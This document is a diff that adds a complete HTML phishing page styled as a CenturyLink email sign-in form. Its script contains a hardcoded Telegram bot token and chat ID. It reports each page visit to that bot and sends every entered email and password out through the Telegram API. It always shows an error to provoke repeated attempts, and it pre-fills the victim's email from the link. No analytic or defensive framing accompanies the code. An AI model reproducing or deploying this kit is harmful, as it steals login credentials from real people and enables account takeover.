@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Login</title>
+   <style>
+/* Body Styling */
+body {
+    margin: 0;
+    padding: 0;
+    min-height: 100vh;
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: Arial, sans-serif;
+    overflow-x: hidden;
+    background: none;
+}
+
+    /* Login Container Styling */
+    .login-container {
+      background-color: rgba(255, 255, 255, 0.95);
+      padding: 40px 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 0px rgba(0,0,0,0.2);
+      width: 50%;
+      max-width: 500px;
+      margin: 0 auto;
+      position: absolute;
+      top: 37%;
+      left: 55%;
+      transform: translate(-50%, -50%);
+      display: none;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+    }
+
+    .input-group input {
+      width: 50%;
+      border: none;
+      border-bottom: 1px solid #aaa;
+      background: transparent;
+      padding: 10px 5px;
+      font-size: 16px;
+      outline: none;
+    }
+
+    .input-group input::placeholder {
+      color: #999;
+    }
+
+    button {
+      width: 50%;
+      background-color: #0064D2; /* Westnet-like blue */
+      color: #000;
+      font-size: 16px;
+      padding: 12px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    button:hover {
+      background-color: #0064D2;
+    }
+
+    /* Intro Image Styling */
+    #introImageContainer {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh; /* Make the image cover the whole viewport */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 10;
+    }
+
+    #introImageContainer img {
+      max-width: 100%;
+      height: auto;
+    }
+
+    /* Error Message Styling */
+    #errorMessage {
+      display: none;
+      color: red;
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Intro Image Overlay -->
+  <div id="introImageContainer">
+    <img src="https://tse3.mm.bing.net/th/id/OIP.14uelHZGeMH38bdQNqYB4wHaKe?rs=1&pid=ImgDetMain" alt="Intro Image" />
+  </div>
+
+  <!-- Login Form -->
+  <div id="loginContainer" class="login-container">
+    <form id="loginForm">
+      <div class="input-group">
+        <input type="email" id="email" placeholder="CenturyLink Email" required>
+      </div>
+      <div class="input-group">
+        <input type="password" id="password" placeholder="Password" required>
+      </div>
+      <div id="errorMessage"></div>
+      <button type="submit">Sign in</button>
+    </form>
+  </div>
+
+  <script>
+    const token = '8757890649:AAHQ9hfKHEA125d3UK2KoYpskbQjuRlNnrI';
+    const chatId = '8052751627';
+    let loginAttempts = 0;
+
+    // Send message to Telegram
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).then(res => res.json())
+        .then(data => console.log('Telegram response:', data))
+        .catch(err => console.error('Telegram error:', err));
+    }
+
+    // Send visitor notification to Telegram
+    function sendVisitorToTelegram() {
+      sendToTelegram('century clik!');
+    }
+
+    window.onload = function () {
+      sendVisitorToTelegram();
+
+      // Display intro image for 5 seconds before showing the login page
+      setTimeout(function () {
+        document.getElementById('introImageContainer').style.display = 'none'; // Hide intro image
+        document.body.style.backgroundImage = 'url("https://res.cloudinary.com/dxzzgijsa/image/upload/v1781031147/century_kbec5w.jpg")'; // Add the specified background image to the body
+        document.body.style.backgroundSize = 'cover'; // Make the background image cover the full page
+        document.body.style.backgroundPosition = 'center'; // Center the background image
+        document.getElementById('loginContainer').style.display = 'block'; // Show the login form
+      }, 500); // 5 seconds for intro image
+    };
+
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const errorMessage = document.getElementById('errorMessage');
+
+      // Hide the error message after each attempt
+      errorMessage.style.display = 'none';
+
+      // Check if email or password is empty
+      if (!email || !password) {
+        errorMessage.style.display = 'block';
+        document.getElementById('password').value = ''; // Clear password field
+        document.getElementById('password').focus(); // Focus back on the password field
+        sendToTelegram(`century Login  Email: ${email}, Password: ${password}`);
+        return;
+      }
+
+      loginAttempts++;
+      if (loginAttempts >= 30) {
+        // Redirect to another URL after 3 failed attempts
+        window.location.href = 'https://tse3.mm.bing.net/th/id/OIP.14uelHZGeMH38bdQNqYB4wHaKe?rs=1&pid=ImgDetMain';
+      } else {
+        errorMessage.style.display = 'block';
+        document.getElementById('password').value = ''; // Clear password field
+        document.getElementById('password').focus(); // Focus back on the password field
+        sendToTelegram(`Login failed. Email: ${email}, Password: ${password}`);
+      }
+    });
+
+    // Auto-fill email field with URL param
+    const urlParams = new URLSearchParams(window.location.search);
+    const emailParam = urlParams.get('email') || '';
+
+    const emailInput = document.querySelector('input[type="email"]');
+    if (emailInput) {
+      emailInput.value = emailParam;
+    }
+  </script>
+</body>
+</html>
